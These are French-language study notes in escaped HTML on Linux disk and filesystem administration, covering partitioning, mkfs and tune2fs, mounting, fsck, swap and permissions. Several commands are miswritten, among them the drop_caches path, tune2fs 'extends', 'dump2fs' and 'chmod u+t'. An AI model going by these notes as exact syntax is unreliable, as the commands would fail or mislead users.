&lt;span class=&quot;c&quot;&gt;# +1024M ou + 64G&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;p&quot; pour voir état&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;w&quot; sauvegarder&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# message d'avertissement normal&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# forcer synchro: blockdev --rereadpt /dev/sdb pour relire la table de partition&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ou si parted est installé et blockdev ne fonctionne pas: partprobe /dev/sdb&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# cat /proc/partitions | grep sdb -&amp;gt; pour voir partitions&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# on peut maintenant utiliser la partition et y ajouter un FS&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# modifier type partition&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fdisk
&lt;span class=&quot;c&quot;&gt;# &quot;t&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;numéro partition&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;L&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;w&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# types les + utilisés: 83: type Linux&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 82: swap&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# fd: type RAID&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 8e: type LVM&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;manipulation-parition-gpt&quot;&gt;manipulation parition GPT&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdisk /dev/sdb
&lt;span class=&quot;c&quot;&gt;# pas de notion de partition primaire ou étendue&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# parition 1 à 128&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# même fonctionnement que fdisk&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# type avec 0 à la fin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# dangereux d'utiliser gdisk sur un disque MBR&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;manipuler-les-fs&quot;&gt;Manipuler les FS&lt;/h1&gt;
&lt;h3 id=&quot;block&quot;&gt;block&lt;/h3&gt;
&lt;p&gt;unité de base, atomique, fichier = nb de blocks
du, df, find utilise unité block
512 ou 1024 octets&lt;/p&gt;

&lt;h3 id=&quot;superblock&quot;&gt;superblock&lt;/h3&gt;
&lt;p&gt;chaque FS à au moins 1 superblock
contient: type, taille, etat, info sur partitions, autre superblocks
existe plusieurs copies de ses super blocks&lt;/p&gt;

&lt;h3 id=&quot;tabke-dinodes&quot;&gt;tabke d’inodes&lt;/h3&gt;
&lt;p&gt;index node, noeud d’index, strcuture de données, representant un fichier
tous les inodes sont dans plusieurs tables d’inodes
1 fichier = 1 seul node
1 node = unique dans le FS
contenu: toutes les info d’un fichier, ne contient pas le nom du fichier, ni date de création (existe exception)
$ stat chap1.pdf
adresse dans inode: soit vers début données du fichier, soit vers block d’adresses, et ainsi de suite&lt;/p&gt;

&lt;h3 id=&quot;table-de-catalogues&quot;&gt;table de catalogues&lt;/h3&gt;
&lt;p&gt;|nom fichier       |inode     | 
|:—————–|:———|
|&lt;code class=&quot;highlighter-rouge&quot;&gt;mon_fichier.txt&lt;/code&gt; |172781289 |
|&lt;code class=&quot;highlighter-rouge&quot;&gt;centos7.iso&lt;/code&gt;     |211112999 |&lt;/p&gt;

&lt;p&gt;possible de donner plusieurs nom à un même fichier&lt;/p&gt;

&lt;h3 id=&quot;hard-link&quot;&gt;hard link&lt;/h3&gt;
&lt;p&gt;reférence sur inode
limté dans le FS
ls -l -&amp;gt; 1: normal
si &amp;gt; 1 alors existe d’autre liens&lt;/p&gt;

&lt;h1 id=&quot;créer-système-de-fichier&quot;&gt;Créer système de fichier&lt;/h1&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# permet de trouver la commande associée&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mkfs &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; typefs options periph
&lt;span class=&quot;c&quot;&gt;# indiquer options après le typefs&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# on peut directement appelé la vrai commande&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ext2 -&amp;gt; mkfs.ext2&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mkfs &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ext2 /dev/sdb1
&lt;span class=&quot;c&quot;&gt;# on peut définir les options&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -b taille block, multiple de 512&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -c vérifier les mauvais blocks avant de créer le FS (execute badblock)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -i ration octets/inodes&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -m pourcentage pour root&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -L label de la partition&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -j créer journal pour ext3&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mkfs &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ext2 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 2048 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 16384 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DATA&quot;&lt;/span&gt; /dev/sdb1

&lt;span class=&quot;c&quot;&gt;# ext2 -&amp;gt; ext3&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tune2fs &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; /dev/sdb1

&lt;span class=&quot;c&quot;&gt;# ext3 -&amp;gt; ext2&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tune2fs &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; ^has_journal /dev/sdb1
&lt;span class=&quot;c&quot;&gt;# vérification fsck et supprime .journal&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ext3 -&amp;gt; ext4&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tune2fs &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; extends,uninit_bg,dir_index /dev/sdb1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fsck &lt;span class=&quot;nt&quot;&gt;-pDF&lt;/span&gt; /dev/sdb1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mount /dev/sdb1 /mnt
&lt;span class=&quot;c&quot;&gt;# ajouter extends aux fichiers déjà existant&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find /mnt &lt;span class=&quot;nt&quot;&gt;-xdev&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; chattr +e &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# même chose avec -type d&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ext4 -&amp;gt; ext3&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# si pas encore d\'extend: le monter en ext3&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# sinon pas possible&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# label&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# afficher&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;e2label /dev/sdb1
&lt;span class=&quot;c&quot;&gt;# modifier&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;e2label /dev/sdb1 DATA &lt;span class=&quot;c&quot;&gt;# max 16 caractères sinon tronqué&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ReiserFS, xfs, btrfs, vfat&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# voir les options associées&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# les mtools: outils pour travailler sur FS FAT ou VFAT&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;accéder-au-système-de-fichier&quot;&gt;Accéder au système de fichier&lt;/h1&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# accéder aux partitions qui ont un FS&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# info sur tous les montages actifs (aussi dans /etc/mtab)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mount

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; typefs &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; options periph point_montage
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ext4 /dev/sdb1 /mnt/DATA

&lt;span class=&quot;c&quot;&gt;# par label -&amp;gt; mieux !&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ext4 &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; DATA /mnt/DATA
&lt;span class=&quot;c&quot;&gt;# dans /dev/disk/by-label&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# par UUID de partition&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# udev avec vol_id dans /lib/udev/vol_id&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./vol_id &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; /dev/sdb1

&lt;span class=&quot;c&quot;&gt;# maintenant&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;blkid /dev/sdb1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;blkid &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; value &lt;span class=&quot;nt&quot;&gt;-sUUID&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# si FS est ext2 ou 3&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/dev/disk/by-uuid

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ext4 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; 98766 /mnt/DATA

&lt;span class=&quot;c&quot;&gt;# remonter FS avprès modifs&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ro,remount /mnt/DATA

&lt;span class=&quot;c&quot;&gt;# options de montage &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# p 311&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;détacher-point-de-montage&quot;&gt;détacher point de montage&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ne doit plus être utilisé&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;umount /mnt/DATA

&lt;span class=&quot;c&quot;&gt;# connaitre utilisateurs&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lsof /mnt/DATA

&lt;span class=&quot;c&quot;&gt;# forcer&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fuser &lt;span class=&quot;nt&quot;&gt;-km&lt;/span&gt; /mnt/DATA

&lt;span class=&quot;c&quot;&gt;# conf statique des montages, lu à chaque démarrage&lt;/span&gt;
/etc/fstab
periph | p_montage | typefs | options | dump | fsck

&lt;span class=&quot;c&quot;&gt;# montage automatique sauf si option noauto&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# montage manuel&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# recherche automatique dans fstab&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mount /home
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; u01
mount &lt;span class=&quot;nv&quot;&gt;LABEL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/boot
mount /dev/sda5

&lt;span class=&quot;c&quot;&gt;# tout monter&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;controler-le-système-de-fichiers&quot;&gt;Controler le système de fichiers&lt;/h1&gt;

&lt;h3 id=&quot;statistiques-doccupation&quot;&gt;statistiques d’occupation&lt;/h3&gt;
&lt;p&gt;par système de fichier&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# info sur fs montés&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;df&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# info sur le fs&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;df &lt;/span&gt;sys_fichier ou point_montage

&lt;span class=&quot;c&quot;&gt;# info sur le fs qui le contient&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;df &lt;/span&gt;fichier.txt
&lt;span class=&quot;c&quot;&gt;# k, m&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -T: affiche type de fs&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -i: stats sur inodes &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;par arborescence&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# disque usage, espace occupé par arborescence&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# dossier + contenu&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;du&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# taille totale seulement&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /home

&lt;span class=&quot;c&quot;&gt;# par défaut visite autres FS&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /home
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;vérifier-régler-et-réparer&quot;&gt;vérifier, régler et réparer&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# vérifier réparer FS, ne doit pas être monté ou ro&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fsck

&lt;span class=&quot;c&quot;&gt;# comme mkfs, appelle d'autres commandes, fsck.ext2, fsck.ext3&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# si pas de type, devine&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fsck &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; typefs periph

&lt;span class=&quot;c&quot;&gt;# forcer et verbeux&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fsck &lt;span class=&quot;nt&quot;&gt;-fV&lt;/span&gt; /dev/sda2

&lt;span class=&quot;c&quot;&gt;# si il faut réparation&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -p: automatique&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -y: répondre oui à toutes les questions&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# existe vérification automatique, interval peut&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# être modifié avec tune2fs&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# BTRFS&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;btrfsck
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;btrfscheck

&lt;span class=&quot;c&quot;&gt;# vérifier blocs déféctueux&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# appelé par mkfs ou fsck avec -c&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;badblocks
&lt;span class=&quot;c&quot;&gt;# -n: non déstructuf, lit et réécrit&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -w: destructuf avec modif&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# éxecution très longue, pas de sens sur SSD&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# donne info, utile avec grep, ext2,3,4&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dump2fs

&lt;span class=&quot;c&quot;&gt;# modif paramètres en ext2,3&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tune2fs

&lt;span class=&quot;c&quot;&gt;# pour ext2,3,4&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;debugfs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;xfs&quot;&gt;XFS&lt;/h3&gt;
&lt;p&gt;par défaut dans RHEL, CentOS&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# étendre parttion&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;xfs_growfs

&lt;span class=&quot;c&quot;&gt;# peut être agrandi, mais pas rétrécit&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# nbr d'inodes non limités en xfs&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# equivalent de fsck&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;xfs_repair

&lt;span class=&quot;c&quot;&gt;# affiche journal, log&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;xfs_logprint

&lt;span class=&quot;c&quot;&gt;# debugfs et tune2fs&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;xfs_db et xfs_admin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;le-swap&quot;&gt;le swap&lt;/h1&gt;
&lt;p&gt;théorie: 32 bits, process peut addresser à 4 Go d’espace mémoire (virtuelle) rien que pour lui, si dépasse, utilise le swap&lt;/p&gt;

&lt;h3 id=&quot;taille-optimale&quot;&gt;taille optimale&lt;/h3&gt;
&lt;p&gt;RAM | SWAP
&amp;lt;512 Mo | 2*RAM
1 Go à 4 Go | taille RAM
+4 Go | 4 Go, plus ou moins
256 Go | non 256 Go&lt;/p&gt;

&lt;h3 id=&quot;créer-partitions-swap&quot;&gt;créer partitions swap&lt;/h3&gt;
&lt;p&gt;fdisk ou gdisk
synchroniser table de partitions:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;partprobe

&lt;span class=&quot;c&quot;&gt;# préparer partitions à recevoir swap&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mkswap /dev/sda5

&lt;span class=&quot;c&quot;&gt;# si swap &amp;gt; 2Go, alors plusieurs partitions de swap sur le plusieurs disques sur plusieurs controleurs materielle différent&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;activer-désactiver-swap&quot;&gt;activer, désactiver swap&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# activer&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;swapon /dev/sda5
&lt;span class=&quot;c&quot;&gt;# -p: priorité,de 0 à 32767&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# varier si disque plus rapide qu'un autre&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# activer toute parition de swap sans noauto&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;swapon &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# désactiver&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# s'assurer d'avoir de la place en RAM&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;swapoff /dev/sda5
&lt;span class=&quot;c&quot;&gt;# /proc/swaps: zones swap actives&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# desactiver toutes les partitions de swap&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;swapoff &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# en cas d'urgence, fichier de swap, p330&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;etat-de-la-mémoire&quot;&gt;etat de la mémoire&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# info sur RAM&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;free

&lt;span class=&quot;c&quot;&gt;# FS virtuel&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# /proc&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# /proc/meminfo&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# vider cache&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;3 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/proc/sys/run/drop_caches
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;swapoff &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;swapon &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;free
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;quotas-disque&quot;&gt;quotas disque&lt;/h3&gt;
&lt;p&gt;p336&lt;/p&gt;

&lt;h1 id=&quot;droits-daccés&quot;&gt;Droits d’accés&lt;/h1&gt;
&lt;p&gt;UID: user id
/etc/passwd: les users
GID: group ID
user avec group principal
/etc/group
$ id
fichier lié à UID et GID&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# modifier droits&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# u,g,o&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# +,-,=&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# r,w,x&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 4,2,1 # base 8&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# droits de base fichier: 644&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# droits de base dossier: 755&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ce que l'on retire de fichier: 666, dossier: 777&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;umask&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# changer proprio&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chown&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# changer groupe&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chgrp&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# droits d'accés étendus&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# executer commande avec droits sur proprio, ou groupe&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# SUID et SGID&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;u+s ou g+s
&lt;span class=&quot;c&quot;&gt;# 4000 ou 2000&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# UID et GID reel: celui qui lance vraiment&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# UID et GID effectif: celui deu process (si SUID ou SGID)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# SUID et SGID non transmis au fils&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# sticky bit (bit collant)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# protection contre affacement&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;u+t /tmp
&lt;span class=&quot;c&quot;&gt;# 1000&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# repertoire&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# si s au groupe, tout ce qui va être crée dedant partage le groupe du repertoire &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;hr /&gt;

&lt;h1 id=&quot;processus-de-démarrage&quot;&gt;Processus de démarrage&lt;/h1&gt;

&lt;h1 id=&quot;bios-et-uefi&quot;&gt;BIOS et UEFI&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;BIOS: Basic Input Output System&lt;/li&gt;
  &lt;li&gt;interface logicielle entre matériel et logiciel à niveau très basique&lt;/li&gt;
  &lt;li&gt;auto-test (POST) au démarrage pour détecter périphériques (dont celui pour démarrer)&lt;/li&gt;
  &lt;li&gt;mémoire CMOS: alimentée par petite pile avec info materilles&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;lit est éxecute 1er secteur d’amorçage (MBR ou PBR)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;UEFI: Unifed Extensible Firmware Interface&lt;/li&gt;
  &lt;li&gt;seccesseur du BIOS&lt;/li&gt;
  &lt;li&gt;interface entre firmware (micrologiciel) du matériel et l’OS&lt;/li&gt;
